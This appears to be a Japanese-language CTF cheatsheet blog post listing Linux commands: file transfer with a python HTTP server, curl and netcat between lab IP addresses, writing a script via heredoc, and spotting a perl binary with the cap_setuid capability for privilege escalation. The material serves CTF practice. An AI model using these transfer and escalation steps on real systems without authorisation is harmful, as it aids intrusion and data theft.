---
layout: post
title: "linux_command"
published : true
tags: CTF Common cheatsheet linux 
---
## curl
### 送信側(待受)
```sh
python3 -m http.server 8888
```
### 受信側
```sh
curl 10.10.14.14:8888/src.file -o dst.file
```
## nc
### 受信側(待受)
```sh
nc -lvnp 9999 > some-file-name.tar.gz
```
### 送信側
```sh
nc 10.11.42.116 9999 < ff.tar.gz
```

## ヒアドキュメントでスクリプトを書く
```sh
cat << EOF > test.sh
#!/bin/sh
id
EOF
```
## Capabilityを調べる
```sh
david@nunchucks:/opt$ which perl
/usr/bin/perl
david@nunchucks:/opt$ getcap /usr/bin/perl
/usr/bin/perl = cap_setuid+ep
```
